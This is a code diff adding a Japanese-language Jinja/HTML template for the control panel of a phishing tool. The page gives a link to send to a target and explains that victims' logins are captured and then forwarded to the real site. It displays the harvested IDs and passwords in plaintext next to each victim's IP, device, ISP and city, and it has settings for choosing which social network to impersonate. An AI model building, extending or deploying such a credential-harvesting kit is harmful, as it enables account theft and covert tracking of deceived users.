@@ -1,0 +1,132 @@
+{% extends "base.html" %}
+{% block title %}{{ link.name }} — 回収結果{% endblock %}
+
+{% block head %}
+<style>
+.hj-note{background:#1a2233;border:1px solid #2b3a5a;border-radius:10px;padding:12px;
+  margin:10px 0;font-size:12.5px;color:#bcd0f0;line-height:1.9}
+.hj-url{flex:1;min-width:200px;font-family:ui-monospace,Menlo,monospace;font-size:12px;
+  color:#9aa3b2;padding:7px 9px;background:#11141a;border:1px solid #262b36;border-radius:6px}
+.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th,td{text-align:left;padding:6px;border-bottom:1px solid #232734;vertical-align:top}
+.pw{font-family:ui-monospace,Menlo,monospace;color:#7ee08a}
+details{margin:6px 0;background:#11141a;border:1px solid #232734;border-radius:8px;padding:8px}
+summary{cursor:pointer;font-size:12.5px}
+.kv{display:grid;grid-template-columns:170px 1fr;gap:2px 8px;font-size:11.5px;margin-top:6px}
+.kv .k{color:#8b93a7;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+.kv .v{color:#c7cddb;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+</style>
+{% endblock %}
+
+{% block content %}
+<h1>{{ link.name }} <span class="mono dim">{{ code }}</span></h1>
+<div class="dim">{{ label }} になりすまし / 踏まれた回数 {{ total }} /
+  {{ '有効' if link.active else '停止中' }}</div>
+
+<div class="hj-note">
+  ⚠ このページのURLを相手に送るだけ。相手がログインすると、下の「回収したID・パスワード」に
+  そのまま残ります。入力後は本物のサイトへ自動転送されます。
+</div>
+
+<div class="card">
+  <div class="dim">相手に送るURL</div>
+  <div class="row">
+    <input class="hj-url" id="shareurl" readonly value="{{ share }}" onclick="this.select()">
+    <button class="go" id="sharecopy" type="button">コピー</button>
+    <button id="shareshare" type="button">共有</button>
+    <a class="btn" href="{{ share }}" target="_blank">開いて確認</a>
+  </div>
+  {% if is_new %}<div class="dim" style="color:#7ee08a">✓ 作成しました。上のURLを送ってください。</div>{% endif %}
+</div>
+
+<h3>回収したID・パスワード（{{ creds|length }}件）</h3>
+{% if creds %}
+<table>
+  <tr><th>時刻</th><th>ID</th><th>パスワード</th><th>IP</th></tr>
+  {% for cr in creds %}
+  <tr>
+    <td class="mono">{{ (cr.ts or '')[:19] }}</td>
+    <td class="mono">{{ cr.login_id }}</td>
+    <td class="pw">{{ cr.password }}</td>
+    <td class="mono">{{ cr.ip }}</td>
+  </tr>
+  {% endfor %}
+</table>
+{% else %}
+<p class="dim">まだ誰もログインしていません。</p>
+{% endif %}
+
+<h3>踏んだ端末（{{ total }}件）</h3>
+{% for h in hits %}
+<details>
+  <summary>
+    <span class="mono">{{ (h.ts or '')[:19] }}</span> /
+    {{ h.device or '不明' }} {{ h.os or '' }} / {{ h.browser or '不明' }}
+    {% if h.inapp %}（{{ h.inapp }}内）{% endif %}
+    {% if h.city %} / {{ h.city }}{% endif %}
+    <span class="mono"> #{{ h.id }}</span>
+  </summary>
+  <div class="kv">
+    <div class="k">IP</div><div class="v">{{ h.ip }}</div>
+    <div class="k">国 / 都市</div><div class="v">{{ h.country or '-' }} / {{ h.city or '-' }}</div>
+    <div class="k">ISP</div><div class="v">{{ h.isp or '-' }}</div>
+    <div class="k">UA</div><div class="v">{{ h.ua }}</div>
+    {% for k, v in h.extra_obj.items() %}
+    <div class="k">{{ k }}</div><div class="v">{{ v }}</div>
+    {% endfor %}
+  </div>
+</details>
+{% else %}
+<p class="dim">まだ踏まれていません。</p>
+{% endfor %}
+
+<h3>設定</h3>
+<form method="post" action="/hp/{{ code }}/update" class="card">
+  <label>名前 <input type="text" name="name" value="{{ link.name }}"></label>
+  <label>なりすますSNS
+    <select name="platform">
+      {% for p, pl in platforms %}
+      <option value="{{ p }}" {% if link.platform == p %}selected{% endif %}>{{ pl }}</option>
+      {% endfor %}
+    </select></label>
+  <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}"></label>
+  <label>メモ <input type="text" name="note" value="{{ link.note or '' }}"></label>
+  <label>状態
+    <select name="active">
+      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
+      <option value="0" {% if not link.active %}selected{% endif %}>停止中</option>
+    </select></label>
+  <button type="submit">保存</button>
+</form>
+<div class="row">
+  <form class="inline" method="post" action="/hp/{{ code }}/clear"
+        onsubmit="return confirm('記録を消しますか？')"><button type="submit">記録を消す</button></form>
+  <form class="inline" method="post" action="/hp/{{ code }}/delete"
+        onsubmit="return confirm('削除しますか？')"><button type="submit">削除</button></form>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+(function () {
+  var u = document.getElementById('shareurl').value;
+  function copy(b) {
+    function done() { b.textContent = 'コピーしました';
+      setTimeout(function () { b.textContent = 'コピー'; }, 1500); }
+    function fb() {
+      try { var t = document.createElement('textarea'); t.value = u;
+            t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
+            t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
+    }
+    try { navigator.clipboard && navigator.clipboard.writeText
+            ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+  }
+  document.getElementById('sharecopy').addEventListener('click', function () { copy(this); });
+  document.getElementById('shareshare').addEventListener('click', function () {
+    if (navigator.share) navigator.share({ url: u }).catch(function () {});
+    else copy(document.getElementById('sharecopy'));
+  });
+})();
+</script>
+{% endblock %}
